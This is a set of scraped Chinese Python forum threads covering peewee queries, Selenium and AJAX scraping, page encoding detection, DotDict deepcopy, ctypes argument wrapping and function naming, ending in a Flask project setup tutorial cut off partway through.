{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人新入坑的小白，如有不对的地方请包涵~~~！\n<br>在 django 中代码如下:<br>\n模型定义：</p>\n<pre><code>class Friends(models.Model):\n    first_id = models.IntegerField()\n    second_id = models.IntegerField()\n\n    class Meta:\n        unique_together=('first_id', 'second_id',)\n</code></pre>\n<p>查询语句如下：</p>\n<pre><code>    friend_list_info = []\n    friend_list1 = Friends.objects.filter(first_id=Id).values_list('second_id', flat=True)\n    friend_list2 = Friends.objects.filter(second_id=Id).values_list('first_id', flat=True)\n    friend_list = list(friend_list1) + list(friend_list2)\n</code></pre>\n<p>意思是建立一个好友列表， 2 个人之间的关系是唯一的。通过输入的 Id ，查询出对应的好友的 Id 列表。\n现在学习 sanic 框架用的 peewee,不知道应该如何实现。希望大家指教~！</p>\n</div></div>"], "reply": "4", "tittle": "请教如何用 peewee 实现类似 django ORM 的这种查询效果", "comment": ["回复不能用 Markdown ，代码比较难看：\r", "\r", "friend_list = Friends.select(Friends.second_id).where(Friends.first_id=Id)\r", "\r", "参考： ", " 感谢回复，但是我想先构建这样的表， peewee 里好像没有 unique_together 只能设置单独的 unique. 然后是，查询结果应该是一个 id 的列表，上面得到是一个 object 。不知道能不能实现", " \r", "\r", "1. peewee 没有 unique_together ，可以考虑直接用 primary_key = ('first_id', 'second_id')，需要放在 class Meta 里（具体查下文档）\r", "\r", "2. 得到 object 是正常的， ORM 框架就是这种思路。取法： for f in friend_list: f.first_id", " 感谢！！！关于 unique_together 我 google 到了用法相似的 indexes 写在 meta 里面。已经解决问题啦，感谢耐心的大兄弟！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚刚安装了 selenium 库，发现用这个方法找 id 为‘ cp ’的元素，又快又方便。\ndriver = webdriver.PhantomJS()\ndriver.get('<a href=\"http://www.baidu.com\" rel=\"nofollow\">http://www.baidu.com</a>')\ndata = driver.find_element_by_id('cp').text\nprint(data)</p>\n<p>后来打开浏览器 chrome 右键检查缺没有发现 id=‘ cp' 这个标签元素，难道浏览器里面隐藏了这个 id=’ cp ‘吗？</p>\n<p>还有发现百度在开发者模式里面发了招聘广告，藏得太深了吧。</p>\n</div></div>"], "reply": "6", "tittle": "闲聊", "comment": ["有些元素是 js 创建的，右键源代码不一定看得到\r", "F12 就可以看到的招聘信息，隐藏的不算深吧", "哈哈哈 我前几天也是这样。不点击页面中的 js 触发按钮的话，相关代码是不会出现在检查里的！ 而且这个库可以 模仿点击 这种按钮。\r", "\r", "🤔🤔连续发了两个爬虫主题，关注你了。对了，代码没换行吧？", " 我手机上没注意看，你学到哪了？我们多交流吧", " 在用 bs4 和你提到的 selenium ，有本书挺好的叫 python 网络数据采集。我是看这本书才知道这个库的🤔。 要不加个微信？我读大学，看到你高中就学这些东西，好 6 啊", " 那本书我也有，还在看第一章呢。我微信 andmspy", " 加了🤔🤔"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>网页如下：\n<a href=\"https://www.joinquant.com/post/2997?f=sharelist&amp;m=list\" rel=\"nofollow\">https://www.joinquant.com/post/2997?f=sharelist&amp;m=list</a></p>\n<p>特定的内容：当前持仓和最新下单</p>\n<p>我只想做一个发现更新就发邮件通知我的小程序，现在不知道怎样爬里面的内容。。。</p>\n</div></div>"], "reply": "7", "tittle": "我用 phantomJS+beautifulsoup 没法看到网页里面特定的内容，请问应该用什么方法来做爬虫啊？", "comment": ["直接爬接口，当前持仓： ", " ，最新下单： ", " 请问用什么方法找出来的啊？厉害啊~~", "看接口请求呗。  network 里。 讲道理  看生成 html 爬取的是知乎教程的水平", "我也有这个问题。。 有些页面是 js 动态加载的，我用 phantomJS 的 webdriver 访问它，但是有些  class = \"flag xxxx xxxx \"不能用 find_element_by_class_name()获取。因为这个 class 中有空格。。🤔🤔\r", "\r", "不知道怎么直接向网站发出  获取 js 加载内容的请求，有 v 友简单说下方法吗", " 有空格是因为它有多个 class ，我没用过 phantomJS 不清楚它是怎么筛选多个 class 的，如果是 jQuery 的活就将多个 class 用英文的点\".\"串联起来", " 动态加载最好还是分析 ajax 接口，找到规律，然后进行请求", " 多谢，明天去试试 嘿嘿🤓🤓\r", "\r", " 我去搜一下然后试试吧，谢谢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/intohole/pyct\" rel=\"nofollow\">https://github.com/intohole/pyct</a></p>\n<p>主要是大家可以看看思路，我写这个用了很短时间，如果有什么需求可以提给我</p>\n</div></div>", "<div class=\"topic_content\">这个写错了标题， 有人知道怎么删除吗？</div>"], "reply": "14", "tittle": "一个不到 100 行的 Python crontab 实现;", "comment": ["不知道。", "很多地方不太 Pythonic 啊\r", "if is True:\r", " 这是 typo 吧\r", "各种长段的 elif 可以用 dict 代替\r", "condition_type 和 time_range ， 这明明是个 enum ，为什么枚举用字符串做？\r", "\r", "你是其他语言转 Python 的吧？不光要学会用 Python 写出能跑的程序，还要学着 Pythonic 起来", "仅对楼上， pythonic 是指把 python 语法糖玩的很溜？\r", " \r", "1. 至少可以减少低级 typo\r", "2. enum 用字符串和用 dict 是 O(n)和 O(logn)的区别\r", "3. enum 也算语法糖？ C 里就有的 enum switch 叫语法糖？你可以找找 Abusing the C switch statement", "最后， gmtime 是 UTC ， cron 应该是跟随系统时区", " Duplicate with ", "CTItem 的 __equal__ 函数实现的有问题啊", "建议改用 multiprocessing", " 嗯 我工作的时候用 java ， 也写 js ， shell  ， c ， c++ 我觉得抠语言没意思 ， 写东西 写的是思想，我们不是文豪 东西写出来 ， 有用  ， 能让人看懂就好", " 谢谢你的指点", " 谢谢", " 请指教", " 啊啊啊，刚刚看见。我说一下我的感觉哈：\r", "\r", "```\r", "def __eq__(self , obj):\r", "        if isinstance(obj , int):\r", "            for condition in self.conditions:\r", "                if condition.judge(obj) is True:\r", "                    return True\r", "            return False\r", "```\r", "对应的逻辑是这个意思？：\r", "\r", "```\r", "def __eq__(self , obj):\r", "        if isinstance(obj , int):\r", "            for condition in self.conditions:\r", "                if condition.judge(obj) is False:\r", "                    return False\r", "            return True\r", "```", " 我看下 谢谢"]},
{"content": ["<div class=\"topic_content\">import urllib2,re\r<br> f=open('./aa.txt','w')\r<br> headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}\r<br> response=urllib2.Request(url=\"http://www.foxnews.com/us.html\",headers =headers)\r<br> html=urllib2.urlopen(response).read()\r<br> r=re.compile(r'&lt;a href=\"/(?P&lt;date&gt;.+)\"&gt;(?P&lt;title&gt;.+)&lt;/a&gt;&lt;/h3&gt;')\r<br> news=r.findall(html)\r<br> for i in range(len(news)):\r<br>     date=news[0]\r<br>     title=news[1]\r<br>     f.write(title+'     /'+date+'\\n')\r<br> f.close()\r<br>目的是抓取这个网页的关键字并保存为文件 现在已实现保存一段新闻标题\r<br> 但是我想要的是现在的结果中的特定关键字 比如包含 news 这某一个单词的整段文字 初学不知怎么写代码了 求赐教</div>"], "reply": "2", "tittle": "新人求助 请各位老师指正 代码如下", "comment": ["用 in 判定单词是否在内容中，或者 find 判定下，还有用 beautiful soup 解析获取的页面更方便些\r", "\r", "有问题可以加我们的群问，这样效率更高，这个群是一群工程师组建的面向初学者的 python Linux 学习群（ qq 群号： 278529278 ） ，非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "\r", "\r", "请抵制 重新发明轮子 的诱惑"]},
{"content": ["<div class=\"topic_content\">在开发自用爬虫过程中，有的网页是 utf-8 ，有的是 gb2312,有的是 gbk ，如果不加处理，采集到的都是乱码，解决的方法是将 html 处理成统一的 utf-8 编码\r<br>\r<br>版本 python2.7\r<br>\r<br>#coding:utf-8 \r<br>import chardet \r<br>#抓取网页 html \r<br>line = \"http://www.pythontab.com\"\r<br>html_1 = urllib2.urlopen(line,timeout=120).read() \r<br>encoding_dict = chardet.detect(html_1) \r<br>print encoding \r<br>web_encoding = encoding_dict['encoding'] \r<br>#处理，整个 html 就不会是乱码。 \r<br>if web_encoding == 'utf-8' or web_encoding == 'UTF-8': \r<br>html = html_1 \r<br>else : \r<br>html = html_1.decode('gbk','ignore').encode('utf-8')\r<br>\r<br>喜欢 python 或者想学习 python 的朋友可以加 QQ 群： 330637182 ！群内每天会更新 python 资料，还有大牛指导哟！</div>"], "reply": "2", "tittle": "Python 处理抓取中文编码和判断编码", "comment": ["> 解决的方法是将 html 处理成统一的 utf-8 编码 \r", "既然你感兴趣的是字，为什么不统一解码成 unicode 数据类型留着以后再变？\r", "\r", "> 有的是 gb2312,有的是 gbk \r", "这两个东西按照 whatwg TR 推荐用的是一个解码器，没有区分的必要。顺便你忘了 gb18030 ……\r", "\r", "> print encoding \r", "我不知道这玩意怎么来的……\r", "\r", "> else:\r", "所以不是 UTF-8 的 bytes （ py2 \"str\"）全都是 GB 码……？\r", "\r", "> html = html_1.decode('gbk','ignore').encode('utf-8') \r", "没有 GB 18030 支持不能处理 naïve 和💢，这个很捉急啊。\r", "试试 html_1.replace(b'\\x80', b'\\xa2\\xe3').decode('gb18030', 'ignore') 吧。顺路还解决了 Python GBK 没有 cp936 欧元符号的问题。", "这是我平时写爬虫判断网页编码用的：\r", "response = requests.get(url, timeout=3)\r", "charset = response.encoding\r", "if 'gb' in charset or 'GB' in charset:\r", "    soup = bs(response.content.decode('gb18030'), 'html.parser')\r", "else:\r", "    soup = bs(response.content.decode('utf-8'), 'html.parser')"]},
{"content": ["<div class=\"topic_content\">class DotDict(dict):\r<br>    \"\"\"Make attribute-style dict. \r<br>\r<br>    It allows dict.key to paly with the item.\r<br>    \"\"\"\r<br>\r<br>    def __getattr__(self, key):\r<br>        return self[key]\r<br>\r<br>    ......\r<br>\r<br>\r<br>\r<br>&gt;&gt;&gt; a = DotDict({'name': 'Something'})\r<br>&gt;&gt;&gt; a.name\r<br>'Something'\r<br>&gt;&gt;&gt; b = copy.deepcopy(a)\r<br>Traceback (most recent call last):\r<br>  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\r<br>  File \"/usr/local/Cellar/python/2.7.2/lib/python2.7/copy.py\", line 172, in deepcopy\r<br>    copier = getattr(x, \"__deepcopy__\", None)\r<br>  File \"&lt;stdin&gt;\", line 3, in __getattr__\r<br>KeyError: '__deepcopy__'\r<br>\r<br>\r<br>但是我网上查找答案把__getattr__改成这样\r<br>    def __getattr__(self, key):\r<br>        if key in self:\r<br>            return self[key]\r<br>        raise AttributeError(key)\r<br>就不报错了，但是不知道为什么，求大神解释啊，答案链接 <a target=\"_blank\" href=\"https://www.peterbe.com/plog/must__deepcopy__\" rel=\"nofollow\">https://www.peterbe.com/plog/must__deepcopy__</a></div>"], "reply": "4", "tittle": "各位大神们，关于 dotdict 的 deepcopy 问题请教。", "comment": ["在 deepcopy 里面会去找参数对象的__deepcopy__方法，如果可以找到这个方法就直接调用它进行拷贝。\r", "但是在这里 DotDict 对象没有__deepcopy__，所以就会有 KeyError 。\r", "deepcopy 里面调用 getattr 的时候会 except AttributeError ，所以在__getattr__里面抛出这个异常可以正常运行了。", " dict 本身是有__deepcopy__这个的，不会继承么？ 还有就是抛出异常，所以也能捕获到啊，然后打印出异常了，那没有，是怎么处理的。", " #2 dict 没有__deepcopy__吧，你什么版本的？\r", "getattr 源代码里是这样的：\r", "```\r", "result = PyObject_GetAttr(v, name);\r", "if (result == NULL && dflt != NULL && PyErr_ExceptionMatches(PyExc_AttributeError))\r", "{\r", "    PyErr_Clear();\r", "    Py_INCREF(dflt);\r", "    result = dflt;\r", "}\r", "```\r", "其中 v,name,dflt 是 getattr 的三个参数。\r", "也就是如果在 v 里面没找到 name ，并且设置了 dflt 参数，并且发生的错误是 AttributeError ，就把错误清除，然后把 dflt 作为结果返回回去。\r", "换成 Python 的代码大概是：\r", "```\r", "try:\r", "    result = v.name\r", "except AttributeError:\r", "    result = dflt\r", "return result\r", "```", " OK 我大概了解了， dict 确实没有__deepcopy__这样的属性，我在仔细研究下，谢谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>class Category(models.Model):\n    c_name = models.CharField(max_length=100)\n    \n    \nclass Item(models.Model):\n    \"\"\"外键关联到 Category\"\"\"\n    i_name = models.CharField(max_length=100)\n    category = models.ForeignKey('Category', related_name='items',\n                                 null=True, blank=True)\n</code></pre>\n<p><strong>表结构是这样, 要实现在页面上新建一个分类的时候, 可以在同一个页面新建 /编辑这个分类包含的项目和项目具体信息</strong></p>\n<p>目前想到的做法是, 页面上有添加项目的按钮, 点击按钮的时候就通过 Ajax 在数据库中生成了新项目, 然后在保存分类的时候, 再把刚才的项目和分类做关联;\n但这样做的问题是, 如果编辑 /新建分类的时候刷新了页面, 或者其他原因没有最终点击保存的话, 数据库中会增加很多没有外键的 Item 数据</p>\n<p>请问实现这个功能更好的解决办法是什么? 或者说有什么办法, 判断在分类没有成功保存的情况下, 回滚之前建立的项目?</p>\n</div></div>"], "reply": "7", "tittle": "Django 中类似功能的实现方法?", "comment": ["不如定期清理？", " 目前我也是这么想的= ,= 但感觉是没有办法的办法, 想请教下看有没有更好的实现方式", "为什么要点击的时候就新建一个 Item 呢？最终保存的时候再新建不行吗？", "这个设计本身就有些问题。\r", "- Category.name 修改时是直接修改原来 category 的 name 还是创建一个新的 category\r", "- 如果 Category.name 是否直接用原有的 Category ，还是重复创建一个\r", "如果只需要 name 不一样就创建，你直接在 Item 里面判断就可以了。先根据 name 查询 category ，有直接关联，没有创建。在 item 编辑的时候不用区分到底是创建还是编辑。", "三楼+1", "为嘛不最后一步一起创建呢", " \r", " \r", " \r", " \r", "感谢回复\r", "是我简化问题的时候没描述清楚, 这个分类和项目中还有很多其他字段, 业务中有个叫项目模板的东西, 项目模板中预置了信息, 新建项目就是拷贝了一份项目模板然后做定制化的修改; \r", "如果是编辑分类的话, 确实在最后一起保存就可以了; 主要问题是出在新建分类的时候"]},
{"content": ["<div class=\"topic_content\">一、 用兼容层封装数据类型\r<br>在这之前首先先思考一个问题，我们调用的 C 语言的函数，那么传进去的数据也一定要满足 C 语言的规范。虽然 Python 底层是 C ，但是做了高度抽象封装。那么它还符不符合 C 的要求呢？\r<br>首先，我们来看个例子，看看如果不利用兼容层会有什么问题：\r<br> 示例代码：\r<br>from ctypes import cdll\r<br>libc = cdll.msvcrt\r<br>\r<br>printf = libc.printf\r<br>print(printf(b\"Hello, %s\\n\", b\"World!\"))\r<br>print(printf(b\"Hello, %S\\n\", \"World\"))\r<br>print(printf(b\"%d bottles of beer\\n\", 42))\r<br>print(printf(b\"%f bottles of beer\\n\", 42.5))\r<br>输出结果：\r<br>Hello, World!\r<br>14\r<br>Hello, World\r<br>13\r<br>42 bottles of beer\r<br>19\r<br>Traceback (most recent call last):\r<br>  File \"mytest1.py\", line 69, in &lt;module&gt;\r<br>    print(printf(b\"%f bottles of beer\\n\", 42.5))\r<br>ctypes.ArgumentError: argument 2: &lt;class 'TypeError'&gt;: Don't know how to convert parameter 2\r<br>果不其然，就这么报错了！看样子其中有一些任然可以，有一些就不符合要求了。\r<br>其实，除了整数，字符串和字节对象以外的所有 Python 类型必须要通过它们相应的 ctypes 类型来包装，因此我们可以用兼容层将他们封装成需要的 C 数据类型。\r<br>在来看看如下的代码：\r<br>示例代码：\r<br>from ctypes import cdll, c_double\r<br>libc = cdll.msvcrt\r<br>\r<br>printf = libc.printf\r<br>print(printf(b\"%f bottles of beer\\n\", c_double(42.5)))\r<br>print(printf(b\"An int %d, a double %f\\n\", 1234, c_double(3.14)))\r<br>输出结果：\r<br>42.500000 bottles of beer\r<br>26\r<br>An int 1234, a double 3.140000\r<br>31\r<br>我们使用 c_double 类型封装了我们的浮点数。果不其然，我们就可以正确运行我们的代码了。看样子，兼容层，帮我们做了一些事情。\r<br>那么究竟兼容层棒我们做了什么呢？我们能不能利用这个机制传递我们自定义的类型呢？当然是有办法的！\r<br>二、 自定义类型\r<br>示例代码：\r<br>from ctypes import cdll\r<br>libc = cdll.msvcrt\r<br>\r<br>printf = libc.printf\r<br>class Bottles:\r<br>    def __init__(self, number):\r<br>        self._as_parameter_ = number\r<br>bottles = Bottles(42)\r<br>class Flasks:\r<br>    def makeit(self):\r<br>        from random import randint\r<br>        return randint(1, 10)\r<br>    _as_parameter_ = property(makeit)\r<br>print(printf(b\"%d bottles of beer\\n\", bottles))\r<br>print(printf(b\"%d bottles of beer\\n\", Flasks()))\r<br>输出结果：\r<br>42 bottles of beer\r<br>19\r<br>10 bottles of beer\r<br>19\r<br>看来我们给的这个 Flasks 类型完全可以传入，果然有这么一种机制。\r<br>从以上代码可以看出来，其实真正的秘诀就在于 _as_parameter_ 属性。\r<br>那么究竟发生了什么呢？\r<br>其实， ctypes 参数转换是允许使用自定义的类的实例来作为 ctypes 函数参数的。 ctypes 会查找 _as_parameter_ 属性并用作函数参数。当然，这必须符合 ctypes 的要求（如果不包装则只能是整数，字符串或字节）。\r<br>简单来说，就是，通过 _as_parameter_ 参数来将我们的数据转换成符合 C 语言要求的类型，说到底还是使用兼容层。当然，如果你不想把数据在 _as_parameter_ 中存死，可以使用描述符让数据临时请求。这样就能时间动态生成参数了。\r<br>\r<br>喜欢 python 或者想学习 python 的朋友可以加 QQ 群： 421994244 ！群内会更新 python 资料，还有大牛指导哟！</div>"], "reply": "目前尚无回", "tittle": "加速方案 — Python 扩展模块 ctypes — 基本函数调用", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是怎么命名的。 EXO ME ？</p>\n</div></div>"], "reply": "9", "tittle": "mkdir & makedirs ??", "comment": ["两个不同函数啊……", "  我是说为什么不是 mkdir 和 mkdirs", " 有可能是不同的开发者命名的，有可能为了更好地区分两个函数，个人觉得后者居多。别纠结这些没有的。", "命名这种……开发者喜欢就好喽~", "mkdirs 明显是奇怪的缩写，会被吐槽的\r", "mkdir 对应的系统调用叫 mkdir ，大家都懂，另起个名字好像也不合适\r", "\r", "这大概是设计标准库的人的想法，但这个事还是有争议的，比如 Go 也有类似的讨论\r", "比如我大 Node 读文件叫 readFile ，读目录叫 readdir ，大小写都没统一过", " 哈哈哈", "老实说至今为止我见过的命名最为规范的基础库还是.NET 的库，那叫一个赏心悦目", "我记得 mkdir 是一次只能创建一个目录， makedirs 是一次能创建多个目录"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>前言</h2>\n<p>笔者之前未接触过 Python ，只是略懂一点前端，所以说从零开始也相差无几吧。<a href=\"https://github.com/pallets/flask\" rel=\"nofollow\">Flask</a> 是一个轻量级的基于 Python 的框架，但是扩展性非常良好（ Github 上 22000 多个 star 就知道群众的选择不无道理），其他的这里就不多提了，下面就开始我们的网站搭建之路。</p>\n<h2>开始</h2>\n<h5>环境搭建</h5>\n<p>首先需要准备 Python 开发环境，这里推荐使用 <a href=\"https://github.com/yyuu/pyenv\" rel=\"nofollow\">pyenv</a>  来安装和管理 Python 。笔者使用的是 Mac OSX （自带 Python 2.6 ），直接使用如下命令安装 pyenv ：</p>\n<pre><code>brew install pyenv\n</code></pre>\n<p>之后要升级 pyenv 的话就用：</p>\n<pre><code>brew upgrade pyenv\n</code></pre>\n<p>安装完以后，需要配置环境变量，如果使用 zsh ，需要在 ~/.zshrc 加入以下代码：</p>\n<pre><code>export PYENV_ROOT=\"$HOME/.pyenv\"\nexport PATH=\"$PYENV_ROOT/bin:$PATH\"\nexport PATH=$PATH:/sbin/\neval \"$(pyenv init -)\"\n</code></pre>\n<p>如果使用 bash ，在 ~/.bash_profile 中加入即可。保存后重启终端即可。\n如果要安装 Python 3.5.2 ，可以用</p>\n<pre><code>pyenv install 3.5.2\n</code></pre>\n<p>查看安装的 Python 版本：</p>\n<pre><code>pyenv versions\n</code></pre>\n<p>切换局部 Python 环境（这里一般指在 Application 文件夹下切换环境）</p>\n<pre><code>pyenv local 3.5.2\n</code></pre>\n<p>关于其他更多命令，可以参考 <a href=\"https://github.com/yyuu/pyenv/blob/master/COMMANDS.md\" rel=\"nofollow\">Command.md</a></p>\n<h5>使用 IDE</h5>\n<p>这里笔者推荐使用 <a href=\"https://www.jetbrains.com/pycharm/\" rel=\"nofollow\">PyCharm</a> 来进行 python 项目开发。下载安装后（这里笔者下载的是 Professional 版本），新建一个 Flask 项目，然后指定目录、 python 环境：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-a6a3592b958fad2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>完成后点击 Create ，这样就创建了一个 Flask 项目，如果没有安装 Flask ， PyCharm 会自动下载安装。如果想使用 virtualenv ，可以参考下一个步骤。</p>\n<h5>使用虚拟环境</h5>\n<p>使用虚拟环境可以方便地安装 Flask 而且可以在系统的 Python 解释器中避免包的混乱和版本的冲突。 Python 3.3 以后原生支持虚拟环境，命令为 pyvenv 。可以使用如下命令创建虚拟环境（进入刚才创建的 Flask 项目文件夹）：</p>\n<pre><code>pyvenv venv\n</code></pre>\n<p>如果使用 Python 2.7 或者以下版本，可以使用第三方工具 virtualenv 创建虚拟环境：</p>\n<pre><code>sudo easy_install virtualenv\n</code></pre>\n<p>以上命令就可以安装 virtualenv （如果没有安装 easy_install ，需要手动安装，而 pyvenv 已经自带 pip 和 easy_install ）。下一步使用 virtualenv 命令在文件夹中创建 Python 虚拟环境：</p>\n<pre><code>virtualenv venv\n</code></pre>\n<p>完成后，会在 Flask 项目下生成 venv 文件夹。在使用虚拟环境之前，要先使用（ pyvenv 和 virtualenv 创建的虚拟环境是一样的，因此以下命令均可使用）：</p>\n<pre><code>source venv/bin/activate\n</code></pre>\n<p>来激活，如果要退出虚拟环境，可以使用：</p>\n<pre><code>deactivate\n</code></pre>\n<p>创建的虚拟环境会自动安装 pip 和 easy_install ，接下来可以使用：</p>\n<pre><code>pip install flask\n</code></pre>\n<p>接下来就可以在 Flask 中开始自由地遨（入）游（坑）啦！</p>\n<h2>Flask 程序结构</h2>\n<p>在介绍 Flask 的程序结构之前，先来看看标准 Flask 项目的项目结构（笔者以为从宏观到微观的方式可以更快的了解一个东西）。使用 PyCharm 新建 Flask 项目后，项目结构如下图所示：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-9453a5cd5f9321ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>只有三个文件夹（ venv 文件夹已经用命令行生成了）和一个简单的入口类，接下来要把项目结构改造成标准的 Flask 项目结构：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-a5b81ade0bef47c9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>Flask 项目有 4 个顶级文件夹：</p>\n<ul>\n<li>app ——(本例中是 jbox ） Flask 程序保存在此文件夹中</li>\n<li>migrations ——包含数据库迁移脚本（安装了 flask-migrate 后自动生成）</li>\n<li>tests ——单元测试放在此文件夹下</li>\n<li>venv —— Python 虚拟环境</li>\n</ul>\n<p>同时还有一些文件：</p>\n<ul>\n<li>requirements.txt —— 列出了所有的依赖包，以便于在其他电脑中重新生成相同的环境</li>\n<li><a href=\"http://config.py\" rel=\"nofollow\">config.py</a> 存储配置</li>\n<li><a href=\"http://manage.py\" rel=\"nofollow\">manage.py</a> 启动程序或者其他任务</li>\n<li>gun.conf Gunicorn 配置文件</li>\n</ul>\n<p>虽然新建的 Flask Project 已经可以运行，但是我们还是要按照标准的 Flask 程序来改造项目结构。下面我们就来改造一下 TestProject 。\n在命令行中依次使用以下命令来安装 Flask 扩展：</p>\n<pre><code>pip install flask-script\npip install flask-sqlalchemy\npip install flask-migrate\n</code></pre>\n<p>flask-script 可以自定义命令行命令，用来启动程序或其它任务； flask-sqlalchemy 用来管理数据库的工具，支持多种数据库后台； flask-migrate 是数据库迁移工具，该工具命令集成到 flask-script 中，方便在命令行中进行操作。</p>\n<p>然后创建 <a href=\"http://config.py\" rel=\"nofollow\">config.py</a> 文件，内容如下：</p>\n<blockquote>\n<p><a href=\"http://config.py\" rel=\"nofollow\">config.py</a></p>\n</blockquote>\n<pre><code>import os\n\nbasedir = os.path.abspath(os.path.dirname(__file__))\n\nclass config:    \n    SECRET_KEY = os.environ.get('SECRET_KEY') or 'this is a secret string' \n    SQLALCHEMY_TRACK_MODIFICATIONS = True  \n\n     @staticmethod    \n     def init_app(app):        \n        pass\n\nclass DevelopmentConfig(config):    \n    DEBUG = True    \n    SQLALCHEMY_DATABASE_URI = os.environ.get('DEV_DATABASE_URL') or \\        \n    'sqlite:///' + os.path.join(basedir, 'dev')\n\nclass TestingConfig(config):    \n    TESTING = True    \n    SQLALCHEMY_DATABASE_URI = os.environ.get('TEST_DATABASE_URL') or \\                              \n    'sqlite:///' + os.path.join(basedir, 'test')\n\nclass ProductionConfig(config):    \n    SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URL') or \\                              \n    'sqlite:///' + os.path.join(basedir, 'data.sqlite')\n\nconfig = {    \n    'development': DevelopmentConfig,    \n    'testing': TestingConfig,    \n    'production': ProductionConfig,    \n    'default': DevelopmentConfig\n}\n</code></pre>\n<p>config 顾名思义，保存了一些配置变量。 SQLALCHEMY_DATABASE_URI 变量在不同的配置中被赋予了不同的值，这样就可以在不同的环境中切换数据库。如果是远程数据库则从环境变量中读取 URL ，否则在本地路径中创建。</p>\n<p>接下来创建一个 app 文件夹，并在此文件夹中创建一个 <a href=\"http://__init__.py\" rel=\"nofollow\">__init__.py</a> 文件（ init 前后都有两个下划线）：</p>\n<blockquote>\n<p>app/<a href=\"http://__init__.py\" rel=\"nofollow\">__init__.py</a></p>\n</blockquote>\n<pre><code>from flask import Flask\nfrom flask_sqlalchemy import SQLAlchemy\nfrom config import config\n\ndb = SQLAlchemy()\n\ndef create_app(config_name):    \n    app = Flask(__name__)    \n    app.config.from_object(config[config_name])    \n    config[config_name].init_app(app)\n    db.init_app(app)    \n    \n    //此处缺省了部分代码，后面会加上\n    return app\n</code></pre>\n<p>create_app() 就是程序的工厂函数，参数就是配置类的名字，即 <a href=\"http://config.py\" rel=\"nofollow\">config.py</a> ，其中保存的配置可以使用 from_object() 方法导入。</p>\n<p>接下来要解释两个重要的概念——路由和视图函数。客户端把请求发给 Web 服务器， Web 服务器再把请求发给 Flask 程序实例， Flask 程序实例需要知道每个 URL 请求要运行哪些代码，所以保存了一个 URL 到 Python 函数的映射关系。处理 URL 和函数之间关系的程序称为路由，这个函数称为视图函数。例如：</p>\n<pre><code>@app.route('/')\ndef index():\n    return '&lt;h1&gt;Hello World&lt;/h1&gt;'\n</code></pre>\n<p>这里使用 app.route 修饰器来定义路由， app 指 Flask 程序实例对象，后面可以看到使用蓝本管理路由后，由蓝本实例对象来取代 app 。 Flask 使用蓝本来定义路由，在蓝本中定义的路由处于休眠状态，直到蓝本注册到程序上后，路由真正成为程序的一部分。蓝本通常使用结构化的方式保存在包的多个模块中。接下来在 app 文件夹下创建一个子文件夹 main ，并在 main 中创建 <a href=\"http://__init__.py\" rel=\"nofollow\">__init__.py</a> （如果使用 PyCharm ，这里有个快捷方式，右键点击 app 文件夹，在菜单中选择 new -&gt; Python Package ，在弹出的对话框中填写包名然后确认即可）：</p>\n<blockquote>\n<p>app/main/__ <a href=\"http://init__.py\" rel=\"nofollow\">init__.py</a></p>\n</blockquote>\n<pre><code>from flask import Blueprint\n//实例化 Blueprint 类，两个参数分别为蓝本的名字和蓝本所在包或模块，第二个通常填 __name__ 即可\nmain = Blueprint('main', __name__)\n\nfrom . import views, errors\n</code></pre>\n<p>最后引用了两个文件，之所以写在最后是因为避免循环导入依赖，因为接下来在 main 文件夹下 创建的 <a href=\"http://views.py\" rel=\"nofollow\">views.py</a> 和 <a href=\"http://errors.py\" rel=\"nofollow\">errors.py</a> 都要导入蓝本 main 。</p>\n<blockquote>\n<p>app/main/<a href=\"http://views.py\" rel=\"nofollow\">views.py</a></p>\n</blockquote>\n<pre><code>from flask import render_template\n//导入蓝本 main\nfrom . import main\n\n@main.route('/')\ndef index():    \n    return render_template('index.html')\n</code></pre>\n<p>在之前路由的概念解释中， index 函数直接返回了 HTML 字符串（通常不这么做），这里则使用了 render_templete() 函数来渲染 index.html ，并返回。 Flask 使用了 Jinja2 引擎来渲染模板，模板文件都放在 templates 文件夹下，并且只能命名为 templates ，否则 Jinja2 会抛出 TemplageNotFound 异常。由于我们的 app 是一个 Python Package （在目录中包含 <strong>init</strong>.py 默认成为 Python Package ），所以需要将 templates 放在 app 目录下。在 app 下 中创建名为 templates 的文件夹，在 PyCharm 中右键点击该文件夹，然后选择 Make Directory As -&gt; Template Folder ，如图：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-b70233c619c2fa15.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>接下来在 templates 下新建一个 index.html 和 404.html 模板：</p>\n<blockquote>\n<p>app/templates/index.html</p>\n</blockquote>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;    \n    &lt;meta charset=\"UTF-8\"&gt;    \n    &lt;title&gt;index&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Hello World&lt;/h1&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<blockquote>\n<p>app/templates/404.html</p>\n</blockquote>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;    \n    &lt;meta charset=\"UTF-8\"&gt;    \n    &lt;title&gt;Not Found&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Can't find request 